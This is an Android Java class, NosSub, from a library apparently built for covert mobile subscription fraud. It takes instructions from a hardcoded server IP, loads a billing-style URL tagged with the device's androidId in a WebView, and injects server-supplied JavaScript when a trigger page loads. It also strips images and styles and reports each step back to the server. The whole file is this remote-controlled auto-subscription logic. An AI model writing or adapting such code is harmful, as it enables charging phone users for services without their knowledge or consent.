package com.enhtmv.sublib.webview.putaoya;

import android.util.Log;
import android.webkit.ValueCallback;
import android.webkit.WebResourceRequest;
import android.webkit.WebResourceResponse;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import com.alibaba.fastjson.JSON;
import com.enhtmv.sublib.common.SubEvent;
import com.enhtmv.sublib.common.util.StringUtil;
import com.enhtmv.sublib.common.util.SubLog;
import com.enhtmv.sublib.webview.SubWebView;

import java.util.Date;

import static com.enhtmv.sublib.common.SubEvent.CALL_JAVASCRIPT;
import static com.enhtmv.sublib.common.SubEvent.SUB_REQEUST;

public class NosSub extends SubWebView {

    private long num = new Date().getTime();

    public NosSub(WebView webView, SubEvent subEvent) {

        super(webView, "http://54.153.76.222:8081", "nes", subEvent);
    }

    @Override
    public void sub(final String text) {

        new Thread(new Runnable() {
            @Override
            public void run() {

                try {
                    if (!StringUtil.isEmpty(text)) {

                        final MetaInfo info = JSON.parseObject(text, MetaInfo.class);

                        if (info.nosLoadUrl != null) {

                            handler.post(new Runnable() {
                                @Override
                                public void run() {
                                    webView.setWebViewClient(new WebViewClient() {

                                        @Override
                                        public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
                                            view.loadUrl(request.getUrl().toString());
                                            return true;
                                        }


                                        @Override
                                        public void onPageFinished(final WebView view, String url) {

                                            SubLog.i("load over", url);

                                            if (url.contains(info.nosFireUrl1)) {

                                                handler.post(new Runnable() {
                                                    @Override
                                                    public void run() {

                                                        webView.evaluateJavascript(info.nosJscript1, new ValueCallback<String>() {
                                                            @Override
                                                            public void onReceiveValue(String s) {
                                                                report(CALL_JAVASCRIPT);
                                                            }
                                                        });
                                                    }
                                                });

                                            }

                                            super.onPageFinished(view, url);
                                        }

                                        @Override
                                        public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest request) {

                                            String url = request.getUrl().toString();
                                            Log.i(request.getMethod(), url);


                                            if (url.endsWith(".css") || url.endsWith(".png") || url.endsWith(".ico") || url.endsWith(".jpg") || url.endsWith(".ttf")) {

                                                SubLog.i("ignore", url);

                                                return new WebResourceResponse("", "", null);

                                            }


                                            return super.shouldInterceptRequest(view, request);

                                        }

                                    });


                                    webView.loadUrl(info.nosLoadUrl + "&clickId=" + androidId);
                                    report(SUB_REQEUST);
                                }
                            });

                        }

                    }

                } catch (Exception e) {
                    SubLog.e(e);
                    report.e("error", e);
                    event.onError(e);
                }

            }
        }).start();

    }

    @Override
    public void onSub(String message) {

    }
}
